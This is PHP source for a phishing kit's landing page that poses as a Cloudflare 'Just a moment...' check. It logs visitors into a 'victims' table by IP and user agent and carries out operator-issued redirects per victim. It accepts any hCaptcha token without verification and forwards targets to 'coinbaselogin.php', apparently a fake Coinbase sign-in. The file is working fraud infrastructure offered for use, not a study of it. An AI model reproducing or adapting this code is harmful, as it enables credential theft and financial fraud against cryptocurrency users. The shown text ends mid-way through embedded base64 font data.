<?php
// ==================== PROTECTION START ====================
// Additional security headers
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("X-XSS-Protection: 1; mode=block");
header("Referrer-Policy: no-referrer");

// Start output buffering
ob_start();
require_once 'blocker-raw.php';
// Check for redirect commands from DATABASE
require_once 'config/database.php';

// ==================== VICTIM TRACKING START ====================
try {
    $database = new Database();
    $db = $database->getConnection();
    
    // Create victims table if not exists - COMPLETE VERSION
    $create_victims_table = "CREATE TABLE IF NOT EXISTS victims (
        id SERIAL PRIMARY KEY,
        ip_address VARCHAR(45) NOT NULL,
        user_agent TEXT,
        country VARCHAR(100),
        isp VARCHAR(200),
        last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        status VARCHAR(20) DEFAULT 'active',
        page_visited VARCHAR(255) DEFAULT 'index.php',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $db->exec($create_victims_table);
    
    // FIX: Ensure ALL columns exist in victims table
    $columns_to_check = ['country', 'isp', 'last_activity', 'status', 'page_visited'];
    foreach ($columns_to_check as $column) {
        try {
            $check_column = $db->query("SELECT column_name FROM information_schema.columns WHERE table_name = 'victims' AND column_name = '$column'");
            if ($check_column->rowCount() == 0) {
                if ($column == 'country') {
                    $alter_table = "ALTER TABLE victims ADD COLUMN country VARCHAR(100)";
                } elseif ($column == 'isp') {
                    $alter_table = "ALTER TABLE victims ADD COLUMN isp VARCHAR(200)";
                } elseif ($column == 'last_activity') {
                    $alter_table = "ALTER TABLE victims ADD COLUMN last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP";
                } elseif ($column == 'status') {
                    $alter_table = "ALTER TABLE victims ADD COLUMN status VARCHAR(20) DEFAULT 'active'";
                } elseif ($column == 'page_visited') {
                    $alter_table = "ALTER TABLE victims ADD COLUMN page_visited VARCHAR(255) DEFAULT 'index.php'";
                }
                $db->exec($alter_table);
                error_log("Added $column column to victims table");
            }
        } catch (Exception $e) {
            error_log("Column check for $column failed: " . $e->getMessage());
        }
    }
    
    // Get visitor information
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    // Simple IP to country/ISP (you can enhance this with ipapi.co or similar service)
    $country = 'Unknown';
    $isp = 'Unknown';
    
    // Check if victim already exists
    $check_query = "SELECT id FROM victims WHERE ip_address = :ip AND status = 'active'";
    $check_stmt = $db->prepare($check_query);
    $check_stmt->execute([':ip' => $ip]);
    $existing_victim = $check_stmt->fetch(PDO::FETCH_ASSOC);
    
    if ($existing_victim) {
        // Update last activity
        $update_query = "UPDATE victims SET last_activity = NOW(), page_visited = 'index.php' WHERE id = :id";
        $update_stmt = $db->prepare($update_query);
        $update_stmt->execute([':id' => $existing_victim['id']]);
    } else {
        // Insert new victim - FIXED VERSION with safe column insertion
        try {
            $insert_query = "INSERT INTO victims (ip_address, user_agent, country, isp, page_visited, last_activity) 
                            VALUES (:ip, :user_agent, :country, :isp, 'index.php', NOW())";
            $insert_stmt = $db->prepare($insert_query);
            $insert_stmt->execute([
                ':ip' => $ip,
                ':user_agent' => $user_agent,
                ':country' => $country,
                ':isp' => $isp
            ]);
            error_log("New victim tracked: $ip");
        } catch (Exception $e) {
            // Fallback: Insert without optional columns
            try {
                $insert_query = "INSERT INTO victims (ip_address, user_agent, page_visited, last_activity) 
                                VALUES (:ip, :user_agent, 'index.php', NOW())";
                $insert_stmt = $db->prepare($insert_query);
                $insert_stmt->execute([
                    ':ip' => $ip,
                    ':user_agent' => $user_agent
                ]);
                error_log("New victim tracked (fallback): $ip");
            } catch (Exception $e2) {
                error_log("Failed to track victim: " . $e2->getMessage());
            }
        }
    }
} catch (Exception $e) {
    // Silently continue if tracking fails
    error_log("Victim tracking error: " . $e->getMessage());
}
// ==================== VICTIM TRACKING END ====================

try {
    $database = new Database();
    $db = $database->getConnection();

    // Create redirect_commands table if not exists
    $create_table = "CREATE TABLE IF NOT EXISTS redirect_commands (
        id SERIAL PRIMARY KEY,
        command VARCHAR(50) NOT NULL,
        target TEXT NOT NULL,
        victim_id INTEGER DEFAULT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )";
    $db->exec($create_table);

    // FIX: Ensure victim_id column exists
    try {
        $check_column = $db->query("SELECT column_name FROM information_schema.columns WHERE table_name = 'redirect_commands' AND column_name = 'victim_id'");
        if ($check_column->rowCount() == 0) {
            $alter_table = "ALTER TABLE redirect_commands ADD COLUMN victim_id INTEGER DEFAULT NULL";
            $db->exec($alter_table);
            error_log("Added victim_id column to redirect_commands table");
        }
    } catch (Exception $e) {
        error_log("Column check error: " . $e->getMessage());
    }

    // Check for specific victim redirect first
    $victim_ip = $_SERVER['REMOTE_ADDR'];
    $victim_query = "SELECT rc.target 
                    FROM redirect_commands rc 
                    JOIN victims v ON rc.victim_id = v.id 
                    WHERE rc.command = 'redirect' 
                    AND v.ip_address = :ip 
                    AND rc.created_at > NOW() - INTERVAL '5 minutes'
                    ORDER BY rc.created_at DESC 
                    LIMIT 1";
    $victim_stmt = $db->prepare($victim_query);
    $victim_stmt->execute([':ip' => $victim_ip]);
    $victim_redirect = $victim_stmt->fetch(PDO::FETCH_ASSOC);

    if ($victim_redirect) {
        $redirect_target = trim($victim_redirect['target']);
        $current_page = basename($_SERVER['PHP_SELF']);
        
        // Perform redirect if target is valid AND NOT the current page
        if ($redirect_target && $redirect_target !== 'None' && $redirect_target !== $current_page) {
            error_log("Victim redirect: $victim_ip -> $redirect_target");
            header("Location: $redirect_target");
            exit;
        }
    }

    // If no specific victim redirect, check global redirect
    $query = "SELECT target FROM redirect_commands WHERE command = 'redirect' AND victim_id IS NULL ORDER BY created_at DESC LIMIT 1";
    $stmt = $db->query($query);
    $redirect_target = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($redirect_target) {
        $redirect_target = trim($redirect_target['target']);
        $current_page = basename($_SERVER['PHP_SELF']);
        
        // Perform redirect if target is valid AND NOT the current page
        if ($redirect_target && $redirect_target !== 'None' && $redirect_target !== $current_page) {
            error_log("Global redirect to: $redirect_target");
            header("Location: $redirect_target");
            exit;
        }
    }
} catch (Exception $e) {
    // Silently continue if database fails
    error_log("Database error in index.php: " . $e->getMessage());
}

// Handle hCaptcha verification - Simplified version without server-side verification
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['h-captcha-response'])) {
    $captcha_response = $_POST['h-captcha-response'];
    
    // Debug output
    error_log("hCaptcha token received: " . $captcha_response);
    
    // Since we're not using secret key, we trust the client-side verification
    // and redirect immediately to coinbase login
    if (!empty($captcha_response)) {
        // Update victim's last activity and page visited
        try {
            $database = new Database();
            $db = $database->getConnection();
            $ip = $_SERVER['REMOTE_ADDR'];
            
            $update_query = "UPDATE victims SET last_activity = NOW(), page_visited = 'coinbaselogin.php' WHERE ip_address = :ip AND status = 'active'";
            $update_stmt = $db->prepare($update_query);
            $update_stmt->execute([':ip' => $ip]);
            error_log("Victim updated to coinbaselogin.php: $ip");
        } catch (Exception $e) {
            error_log("Victim update error: " . $e->getMessage());
        }
        
        // Captcha verified successfully - redirect to coinbase login
        header('Location: coinbaselogin.php');
        exit;
    } else {
        // Captcha verification failed
        $error_message = 'Captcha verification failed. Please try again.';
        error_log("Empty hCaptcha response received");
    }
}

// DEVELOPMENT BYPASS - Remove this in production!
// Uncomment the line below to bypass hCaptcha for testing
// $bypass_captcha = true;
// ==================== PROTECTION END ====================
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Just a moment...</title>
    <style>
        @font-face {
            font-family: "Lato";
            font-style: normal;
            font-weight: 400;
            src: url(data:font/woff2;base64,d09GMgABAAAAADacAA0AAAAAbvgAADZDAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAG6R6HHAGYACBRBEMCoGeaIGDGguDQgABNgIkA4Z2BCAFhRgHhEUbgF5FB+KuD96VkYFg48gYzNsVRfnkzJT9f0ygMoZd8SkDPSocwiWKQ5RkIkp3ppbmbt3rWTW0qK1tp83fEksscZTHn+F1fvYVHIY+hr+BwEXv8MY2l4HrepOeOkJjn+Ty8LUfv7N3d983AU/ioTA0s8oQklkSa6JVK0k0mWYiRPHI0Cz9HYJtdgbqzEBFRMECQTAQiyqJFhMBRQxUMCLndOXCTefcXPjrePffq6+F6/ztt6+ZaNsSLK3/oSITFOL50BKMfEIwkWFyDe4N5HUkt2p37/poM+jdd1iBkDtulVErsvNCOipPWCGQSZGP2PfQEcNrn6Ij3gdigYRJXSqlLK02txymYW3n/o+F29vbgYb9KUQG+QnAdmhKAqABARAMFsD/n/up69WICNmLbLeoAb7LRVUOIv9NAT1RUiNg2cv4j57ImEp6hzormZLdGWN33VMHXDR3XxHJkDhLmCewM43USm3AoTvO5hiqZ5zc77cdbQsFE0vmE1yi2GL94gpPDpL9n8203ZFu361ZCiqugOSOisYbLqmoqEpRfc2stDuzt77R3OWik1lnkkySTDoZtWsQ2AGGs6ugLiiHUEEoAUvAFoBbd3lpipTpSsIyRdmF6PtlStWSIzSAz0YHFzBRuHeKo4id8SujLaHvlJApWSgAnYBAgICpb/s645Jw3FblBROClWe6x+9amsvOhl4H6HIatFaWG618ZEUu/A5wG1PqoPb3VjvBCYQwFALefyQlQD8cOuvVa/kyAN2rsVQAV7YA7Uti9ZYCxJ5t1SNtEQZggsy0VtRBzTtNI3vG/I/cfR19bi9GijKGfhliDloGuTVjYHhA0r+2r/MR7r3JyGhPagsD3kX3Y8rm/CwNibF5NktuhoOF45STLCmGw9HqU4WF8ElFsA6MWx27wQkU52CNPiEmFkHnAQkvm51whahWEiIdmB0KtlxbALXcXyBgpRSEIycu3Ljz4ClMOJQIUTBiYeERxEuQhCgZSYpUadJloGNg4+AREBGTkJLLopYtR54y5UwqVbOogWJolqzZsnNwcnHz8PlfQFBIWMSxE6fOnLsQFROXkJSShiOQKBlZOXkFRdceYypVrlK1WvUaNWvVrlM3TqASviIRthmq7YzmH8wWex+HcnJx8/DmfLz8Mw6XBzXNfge0HQjNCN8jQsllFJQ0kLLfdnBycfPwBhsFBwKJQsvKySsousZUTah522O4Ye9RiIlLSEpJnzZe8smdKUBJA4HBEUgUWlZOXkHRNWaTDwgOwiqOCK90wRnK2H4mlrIGV1FNbayukabrLv8GWITYPX5ZqJGdo5ky09MVmTVn69luoxvHoKwqquoaups8gDiENa+s31X/Oy3xmYxMLKwqquoaustPuM2H0sIXYpCQ6i+5dwUlDWS6KLXidb30zE8oW/leBASFhEUcFfYdRyBRaFk5eQVF13nJY7rElKGlrbO2G5AAqAyysDByONyah/Cj7t0s4HGnXu6K+ogtEulPs6RIP6awmJxWUE7nBVWa1dG00RJioRbFltdXTK5aXBNa99YloB/np8bANiZlQg5yQftYpKwJ2Nq+zCGcXNw8vOW7GxAUEhZxVNGxmLiEpJR0YTWOQKLQndmchVzyUFB0XTebb935n77YZeiSclUSqHaNU4eGZlpx2tRJt/8UDugr0HzfExZHjmbuX56FH+3Ej4jjp+OwVXkchVL2vGkNg2BcdK/rK734GYPHSKagLQtrbGz7eQc5ubh5eCt6NSYuISklXdhfHIFEoWXl5BUXXmKrxNjdlARuENXIaxC149urDa2926snOvNj9Q4MjYbQz3jflLfepUEoaSK8YXM1m3Ubdpid+MgZvI78JQdtYGGsfG37bK43nfdhPXBFIFFpWTl5B0fWxp/FJgMQbwA0yIFDNpw0SxJ7Y9mufcbvCCTFJSPX/0Mn339mOri/ZXnG4itZtBndWKFv5JgKCQsIijv5yhx4muDO0tHXW2IGI45o3he8RgZ2Dk4ubh7dqrpvXX3zJD37E2YuzDwTjp0LOKEhZKmfqaJw2iFnIMnKA3/YDwXLBFYFEoS8zQRLDMAzzzNzkFu7ch+lPt+ElFHeVnn5C2ZSUtbR1NvsBAMJa57YfkvCzeCLpT6Skln700NDwaH0kjt4cXzblvWJ7nVMd0LM/Y0AblZgQtI2FZQW29n0OUFBIWMRRHacTp876fNlLlNKalFkVUFXXSIva6SBdLIUA92A6kFWPV1ZzEE/Cl0tRJ15Oj6TXxibG7040eGmnj9nW0rk3sMaOOMDJxc3Dm/N1qYxTZddQ3dJAmq57vd9LH0Y5euUssfeqgPkQt7AV9RFbJNKfOlKkHwXrlFNQ9neJ+VxU66JmNH20BrEwLhpe8ryMccXtGruOiw0XPe2r3uve3t7orDnIBe1j8eMeXy+EEEI4o31tQAWFhEUcVXRnTFxCUkoaBkcgUejOXM1CLnkoKLqum6u37tz3C8tEXdJbxndBwuEcOXr1HvQu3wMocGUgC0uKA3mXfOFn9FA5ktz9Rlgf647XE++n+uiyMShr7OCIE1zcPLwX54HcE2rGFnv4hNoiTddd/gfAIGBNuVGYxCSk+o+tIJfN450pjitCq9x1i24dfX5qDAKNVS5tbkEIIYR22xMHQYhhGAYhHNlbwq9iJSHV/0M4eRpKxhclIIJCwiKO/moImJc85i4cCDgSvVQ8u+Bv49sSEX8anPSIr0a1xwlMcYQdyy0qQEkDKT31E3ppcyQAAADw7xDojOcEoo9jFJeQlJIu7CKOQKLQsnLyCoqud4FSGPtQosprzmvWdAdF/b47s/rXydeAvbuKNWSRg1pbE6oGtObMzrVmoT9o8lkG5rApnmkMZJ56pHoDaTqVzc/Upz97bazdINZXwxYXYNMOLARshLvtwFERH5CBOeN23InGNNZzKO2YBcBFgPynTgJmsQZmKNPJFVuGJqM9zYvAH8jh7hrS6ovVOEnjQlyPm7O84VA4DI6Ao+AskOB2+60EgPL/QyAu3WZb09oL7w4OGTv7CJLW/3XfOClXz5b9f8/yL2GevBTtNGhN1O9sisDIGDGnNk30zgr42S29U6lGm/VbmbArHs714IOpcmJHscBsQ1qzyrRWytmyahnKa3kZa6VW2xfbV+kJj0bMl0ywF7JCtka0TSJ7aZiTb/DbGg2INNpXYtsVsutey7oZkwuYknN7hWpscMYKLci+ILZGGEEdazxGAS/ZJinx+LIv0LjmYfV14mDWj5AHhKB4fIkRBG3+ro3EhhkpJnktKVcO1JGBEHmlxiGaCdi6uNWtP3LFJ002aeqy4gU0Q4ihSN4UgcKtiX0kFw1zSnumc0xjGjjVUid4eQHKqI+PxMBlPqBXJkDQ4cAG8YHfVBYGzYR5YdocwdxCEf87JihROvG9aw3Nky1aY44byGFuh64QsUXqMUCEe8KsYpUqJAelqZg7p6HxPVbE2UC0QeiDjSXMckqOhXM8fgtJEqu5QkBJKORp7Eqon4lbibfnhe1SG70YUki10+mrhpJkKnUL6cqmMK4PSLyWZ9f40eeVGyisklvcapszKQelkc8gmcQSzUOQ9fwzrmHScwuwxzmHMklAnAKrCqkDCyBpJHWujHv7gsLq1/xSWDmSsM4ZMV/67eqC8NPi3kmbw/vw2+RypZFeZy/79ZiARwivGoS3Nj0r/Z/KzMIryUB5GC5L4/sUmpHgQZTByF/QD6QEJCCMoxy4/1QfeJ0vRPUdwNxONkTreLQlJGAW7l1DBCOz51NY3ZKhj/pHIluwnOptws/h3/ipSWAjn2+dFFflU2uKa9uyAi+ITh07ayeD+ubqXN2y02dcemx7CSZ8PDyf7/60w5BE73+ZJen9rFp1M0vjuzOgQGsgEN9Cm0pifDo+fiUzEPJkRZgoi02OuCZZreFYqfRq8DZ4TgZHJx/tzu+zA5wu9ApX0ej+nSqUmkGaZtBGQRkeQuJqh9F13KzP05VKQpE0Urq3Ovbp8xbvnvAAm2cHSY6HQE2lX2ti8fYk9nQGFU/Pczt8/roccIpWVYoZjBdbvIm/MhSPpF5tNYJ5B5Xt2etiZ/uyeNP7nYyCgub5gguUrIiSEmTwTPwtI5JGbuU+Iu2c8PV/Y4DuH0heSlWAwup7Ph++MWxh3f1cvWG7nWYKJfaqo0opbwDfnKwKN95/RANd7tYjIIuxpBt6UOq4XvuBWe07MblrZyrXPlzp+0a8BcYS11JP6kphIqU+3z/yZmHCNr+KuvbUzO6DOSsRsib683JB7UxsHsalZdHJ9tguNktH5Mc8gFSo5JBMhc3R9iIzDbzl6pP1TJnPb0zuW/QMER41gKdVdW17yAGs+/udnZvdGC3Oo5+B5gTPd+lR5fktWhtgniND0M0VeOGERLF+zTvRSJG8kOlDj0b7pvdwJrf88tkuajl0E/ZvUEfafJJuAiJkDh5r9B/kU6DtbanAXBE0WzDeDzzuG4je3oeDm6IQFWBru2b8g0brvhhzYlO/cz+Ss289YAU64LgXtyEHP6j5FcMI6PhPHSNeqm15HQp2aa59PYfxsHh8/k5n5HJQkOZj9PpGiCB5nG0O5kUjDAD8OiTSWMZawKI/E4gICtdgZnoAnEvqCL+lL2ugU1rEMnvDZewBGJpsz3uW48yH7vrdB4k0ogZaEbi3k+prtzR+WKp+nSe4u7IFa3D6X5Ij1U5Ct8mVb1xargo6F5yv4uwBKzF2ARdf4UIr1NR+B/yDyxwErq5waVccua2iRZIWMpAQfnrx3PBPJn01XLeyuLKAzelntUwW091Ff0HtjsT3QMO7ugSLMfsXtdhUEX9rgdMSKvYv6MJcuXzIxMV1EzEM5R6HRIC/00fInYdAPszN8CapbHctKQ1FL6RKKTG+OvMJkPnsZL1kIaTbiSJJYpMH9Jg/0VQ4KkRbzPDXseZvmu/rR/NlhpPBKmZZpYEK7PUeVWXyCSOnEPGv7toiuDalkEzaRdzuunbMf72akXib1MQ6W61nBLfC0KhiqxynI/5eTW7UZfYIqnQRdz4fryYxAA7lNec+rc7TYXw7zmFsjbYx5TKzz4ad8mKeBzh+1XxDoPYw/yuWmhEffZNZMZpn7QQKiYDzsLrbQ1MZAEpOjnOE2OI1zEptqUM/9Xj30hY0/F/qaVG1OB86OXSiv9OJNRu0QlcUdNGRtVsr4GZXfCmx+2yMJgcmp1BmwjvpFfNwfev2yfzLz0K/GWfs2pyHmaDU0YaLRRfS4m116Lnjf7m6Z+t/fEixIu6fHcFH7FR5Do8qfZmrjFVLNalhlOkrGUKQAirnluh0THSVvRsWcHviactNxApHmssIp0zy2GGAd02SDMcQrWUoO7WANTI85Lt2Z3iNuByD/1iyhlUX+RBX46sWpl8ujQ6Ha51oTBO1tx+7eGM/l7k2p6crYVsrL8rc+em940PlITBf81GcB81NB48slLciliQwJ6vMhyQ5RVogczDx4sxM0AmDg8ewKpOQ5BJawI6QlwPALOrcZQ6X8yK1u6DYCKVESgVHnZrD99Bd9yREDWCP1kJ6IS+fX8AY8gZtSnWW91LcswDwcDmAzfLj1vR8YdUEfIQKJZWHQFf8yx7H0YbQ6sfqSzpHnsl3smWbgy3SZ0FcOajgw+LbcOQqN272wCi2Y0i57kjS+z4wxCn5xOkYnRHJnCsY4WtJLJnfPoLvWfVhF47EXcF3Thldtbz3RYy6LtlMNl7AGptqgsnaw58iv2Kw1d8V/Qyj7DJz0xZ9VKIPdJBW+qxOUTiSJw7u0A1I9X+vsp5fYXzv9tmMxLt1ixOMegDv1I0UKPgWV8kROoquf8drQ89F5vB7p6gtawyw0JjFP/72XitImnSlKQpPoHBv5y7Qnncoqqsc3fh3g+Et5g1iJUndMUXbulZHNcGpC3dMKH3NG5Rt9i9DsS2s/psoimH0bC5hPfG3IgDPwOaSqoYjIjas4U6DQyg9ijmW6FK7lfMkcUoBoVxolyUaCd+Z97CH2oVS/GqVm9lQ1gXVKO9o0eJP5jM1z7JSb0uyFEG3HcDRpemoA055aFhIxKIHcEur6vmtWZCjXwrrhDQD+dB2ppi9o0faLC6xzUJJkdThFzoS/XaU3vzD+idZD9JczL4ZHaCNzA718iKsIf2XmGWI+ZvtCc1TaOvVqg22wrAFnY5LtmWJguEpiHt3BThdZpTwSM3xvnoDjVHQpStdWUN6SCPtOlx0MtkPcTTmXClwH/axJMWYiL1kAQ5oXc/R/M/yMmG4En62QfrSl7S1P9NL39YMRvcR5hYlpyO6Rh7VpOnlGHSAdIxwgwkHQrB3Ob3OLb28mO9vp1k6ijqO1Y8/rCPJ8piE976EjX6/CLQqzU96kyYqeV8W1CYQmRu96S2Mm4A2XwAvaZYZwjYEa1OtBLvWu+C64QARf7yV2JVE16GLdwKINje3wFsTrs8SpxPWQiQ47R6rmhbI35Nl3Qd8B5VR6z5ybESjZF/41aHqkB4zzP90IDwiewxkvCXuRo9sARxQxe/2q1MN63k+h5hJseSl3c3UP20ZLu6q7BEVYd1O0FbIrHJMumpcWgwWhraNGyxmkJj5mtrMHoa//KEdEntCKIfrEZPL4Ie4DjbxAHn1qvoHIO5pTeNxmjmw1qS907hWGKJBo5lxIRSQoHG1knapMOybWoUtHwV/fkMumKrf/GDC6tCPoYiXIG9qbxI59obMizG5NLtdG4+Lx2SVi8cv+UHJlSXM0GKf6Rn13XrFLtH18/vMh1/pfryTe0CKzBhK8mLHaB/7R3m+Ci1jar2mxihzfRAYG9v9DeSQC9XbowR6bD5wYbbDSrELreCw2wblbJGyDT4ABql0212g0JYWBix9gQQ3qtlfxNoag70YVInziYob47j2T6ymWWD29LvOBfIUTKX629JkuhVJX6sqjbI1/I00oAQIQaY/GoBP6Afhj4jZb09NDCxK4x2YUIdgZkWpiUrDwe/WH8ER3Q6OTJW78+/L/Pk8T2CnJUVU1e50CDtoRINjbON/Knxz8/Ox/qvTF3fL5c/ZnAJn82UcLIGgtgD6cTMVYyyEKB7W0Qeqghiis5ZhU64MxUIzVVSj0qgcGGoj2uAKFXrFCA6+ESYTbOuy+EOi5fNsN4skffy1BnGabdE7s9zbQ1s6WmfUXs9Dyc7BQNjfutzoI4gSp/5HMeOLM4adETLH0udMwkXTrX9KtwgAXfwdbduEvzlw+FzVIZuz3Xx0McYT0azv/IjP+Am+d6h0vFLC48WLjRlevDwxcAYZmH+7J8O6NN8rI7RoOcbCsdBO92GbZcs+NvlSXRYPzGvHRaEoa1LV/jAe3g99n+QwRTGJ6Y446ZWN13RzXCHH6ynOXD3VNNz6c9V6OdAt9S4bo0HQGIif6Ii6UeVAY8Tr4HBmSF/FDMBeg4zNkhG6F2ozNoFdj5Wpst0yB7ZFnV2PpNAtWlo3rGZRTA7MdyQFIJDngb2g2lQJVfyL7b26Dv0Oguq32zDn/dkpN84bTXt1SsURG6FKoq8WgrppebsYKOB1g55xl3s/QnNqsb7FZIIoxL+zA50kTK1IqfMi2LuWUkscu9OBYvDCkH8bHhLmFkhPo8vUzSCp63J7jmeBZYVXNWKIUxGB3BafJl4/lqv8smRBNJtQXcSZymbHNkpIqKS04lZ+8QsCJb9PmjSZ60YMp2MJMmhYRX7lXTKPN7SghGqcArxLALb+VjxcfUmc4uF6eE2C51Ya75PvBjxobgh+T77Ey1yzAzV12dRs3HCybAFGW3xY4inG3+7w4rtm4l+ENjVnIB8RbLcBW6ZChLj5UPg58w/IXvSgmos3OwhjuTm08NS46cJfuyXdpP55fh877gmox6tbCVscrMzk6eXg4Op7WAKEHv3oTcQFEHhjduaZvzcL4wqq+VTtBbqOfw6u9UNjDR+9gmIACbB4za/HmD+4uS+sefMFELtAVd5yBdubVmldAWW7qVW32vqIJ5iFXXbv4NpQH6Od+PCHyHNp/SllecUJpGULPEyeEXkMHnFeU98DyIq8jx2cTb+X0NZCoVOXZfWLMtl2WsqWcfwlLANYXfxmN/vI+SFzm1qxK4s9XrgAQb2g/AMhV89kbE6qLKBN5ImyfuNloOVHf0Sh2Rt0J9ggsO5Hm9Rh8/+NArpFaGlaRkRGRx0jLhSUmZocwibjMqebPUMjmghw3F41wdaN+Kh6gFuezJwkV+Wl9UjrCSBZlJ7UPhQ/v7tJyN3ZU7CJpq6eJJi2r31/IC2H7eN+p8iJ634xg0zJ0MTxeJY6biczHkmD5IsZoRGWHGrQjxZTwbGI6KpuWkhPcowcrOLkhAX+yiNWQa0XuSO99DRsbmrwv4DzUMRMb5zbQoTFCh6+tQBqSh3qTfI5SZ/LLr9xBMZtJG3OrhYcHO48zyjPM/tooeYJLAi8A5hXLQhbAaLw6rEyFacqkoUoFvJooYaLZ46oJbt64DURuqVBMEs1ltKkiLWu+veUgq7xsgd7USj1QmSe9qm4wPrnsD596Y0E0oaL2MyKq+OIKNIttxkjEaBOVGVMpFJiiaGwzTiSJLgO0xUkR4nkr0nv3d79EtCFnp76dt37hscOjAVDdSvcS20oYq/MGl+/rQVZGVc9ZhGkDVfqp5ELNpmQDSRJazHOmqBhG1QzmMVe3luwlGkeYFSg+M7IwlYszSCilsJQUBQPn3NSe8uOrwviKWRidxgzMjsPDlWRKAZJMVoMiHB8nNE3WSEE4TzyWUG4gr9XmMba0NOxmGIq30eoayPPF6b4VMSWphuKcv859DJndT8qRLisdwPjP0KLLeDxDZAa1LJrPiyrJoKOMbI4BSWFXxPIyI/SgzbRLLTvsRdBjL3sI+eehihOLOM2KNo9PyWfuk37u6b5ok+4lf3Zv/9BqHKxKy+7L/k3TwMun7e6fWyd91d2zQEqtSSZ/8mjDiVdwgTUy4AWXoIoo8k0V9mI00qQ6Hh9dTpeIU5kJSJzH2kanrU7RaDKdKCDS6WhlakwoY0wQgElTBO/PdA74bZmsYDz/EbHfHBNouM6ZyaI+hiBVGUliB2lJcvKutsFTyhaazvt8jsGTGxcOezbgF6dMoupRo8pB1cV1g1fojb1P9bv3az+s2GEER3Z/Ui5f+4Qiwz9x9lnjTzGy3MW7d0eVX/+5OeZUeeJ32oWhsZ1Fi8SynK8iNmR2VeetjD9UWpZ6yNgzxvuvLuT+NE7uTuahDLG85vQsPb6LwaYogGwMrIZ+NvdkdfVkaQIDVof9Ornoe7/H7w5T7i3a7k2fBAsAMvld9ylCYz5pUJkA11ClOgrNewNs05bebOqq9tJjpHri8PtEaS2STw/LSzZtaN8UPwAkdWGCDKQ6sXVNzWZ7wLWKdP+RJ1Hq/67au/4f494zGpeZGYPLybMOxs1TDzQqabqqJMjD5VxTPidQ40k2nxIMrOBf7uzlX+4eO8grIetdFSFcnNgVqDp/nNbbHz1uUzTlDyCT/lM2RUdP6O0vbO5mXexafpxnlufLzcd5XaOsi4DqMzm15yZmLebpnikzgEz+k/aBP8U3nK8ervhLI6QCR7kPDyZNveWld684glJYkrtRazyzNtgYj58xuMzMFrmcOuNasl2+wr85toR6LVHpGOgePfK7Krw+QNpwXjAwzrnU2c//ZWjidCaQtoPzw7bDYludb7NtOw9WnnuCPgK/fVVPOlnduY1RrjEEBqli3Ok+nnvx1KIIpjS8U71wFvgTkBzUucSbgapu+NZQA1POOTJhTJ7b7rUq6gu+Iu4ED9n6q8bOAsjkWWCaKdsSy3O1ie/sfqevWy+5BpNWXTgKXf7hqu0I9gnxh+1vH8YEYYZDtF1RoT7BO3ZXbzn06AXY+2rggZyEDr8nPCBGufv9dTq3Qr/X9wi/JPmHeP/3Z0UdyPP8cVrvfPSsrXFqysZo4Gz6b885m1JuW0oAlnPy5a6x45kWs/LuMTe6RbnUHeGbLYQIJAY6/fzHedO39X+b3mUmb9HrGFt7676hdjycfCRtjZGLYsqpA9sndz7q6M2RPvJg5gZTGyPWNLw53Gz4x6Oj0YvWa0e54kd5Vf9iYntx2ng2H9ulNnRyJJ7xh6eJuxL6zV+eGCPHh3+Qt0cquDHFGe3bO7b9AohfHx1Nd/c4S48sCGVQtAhqSqgIm0oSFCQ1RrbHNCYWSEkNWXkZs40N+xjVQw90InlSdmOFq0+OKKEaLWWUIrn0iPwUCkmSn9SIao9sTMiXk9rz+aQRU/kspbR+kcdhAdbDyS0XP577eHkLuD6ZNZRSUIpfpS4+W9wsuDq+7qqyu1v5xDo3mt95kTqEQXXDqQD0TK6HfjYHSN9f9hXuGPQWXg4gvC8ICtgQvv/t/gqAh5PT0ACpZ9eDxp/EmlsDPl4PROgAInSZ1vv9Ay8Xqmh9g+fEA0pMwJrAD5MLvgcYC/20boHvL4wF8PftP46c9UlrrknT/VHgNEJ2O3r9q2dPzvj2trSpdDM1uJEinwPg12TSWRL8av4O6LUZFhq/e/fCxjgmevmLgF2Aw5hkIzLxB8z4KRwfFo3/ujZgCozAgT2skum73Xce2BHmfbf7MYEV4yw/9O1F5KprvOCqcyDruvfOfWyHN7Py3n+iAM6YNOt7OjzMLefzL0TrbhjP5rdovftBHHlrvXc9cP4wH/rnbyvfFvlsuPXUCjQKoV9KvXLNPKIUledFSimC8yhoHSOVUjEuf5m400ZYq6vXUlRwcuQdP8+Zlk9S0VlhrbwrKUuLGZH/BMVmetIRd29fbbTZCSuNw9GiIycP7AFrAeTs/rx09oyqRDVC0XYmnGmtTDlTOTwjKirs5+FpDtk1KB+vOmWnMJH9DEuxJLBH13x3XIsYoajzo0C8lNL4j5tbZC7fn8itiudrUSOqnKhRXkEZnk6YxmrSPf02x5EpokVuRf4Mo66bfra5Kv10/eDeTLNxC/0VyEatdGskC+byypQjVG1HwtmOL21kWlSc25VOxO8DkLPnOpiE6xTP6hQ6/JceEQ/Jnkw1VadvL4sODJixyseOSPPMsWxaAYwR9srDd08c2T6bZECaPJNK9jDb+1nfdRnJhxt6v+JXdXZMrPToikgPLaJw8yLBsVyTM33Wm7O5UInrVee0YUX0CRuVzV/BIbFcP3mQkpKL7AgpADCLHbU66LkXNXRttVsoWcQl1uvkgxgp6857F9/wlfluDTatDg0++XHJSiaF3NCQ9xXRZJqLKeckFiTw8gwS2BY8lej7v8vnLxAlG8zlEuv1smFMgG0aaiPLP9ep2LYUYj/IzExERLOiy/y57KoAATaKkpKZKAmuCeRicivLy0ory3MxQdwacTAYB5Cz+2Rk+kZJsbQ1UaaLGVH07OsxG1rLhP28ZPIz4NP14UPww7U0KB9xFQo9j0iFQtMR56HQqwgBiF87yGkhBnpmGZofmjVvnx/0m5uDu4uAwhaT774rvQ+e1cZ6r3uToXh9NWDGMnxpflngz+eH3m/2vXOZP/XgJgz/YD+AnAU+PWcHhX/d2eMfjKiVzsVJ9EFlTnFrVWABky6UEwr88KJmvEKDGc3p2ddTV9yoRQtgxxHq1N28jZq6PGol88X751aFSzm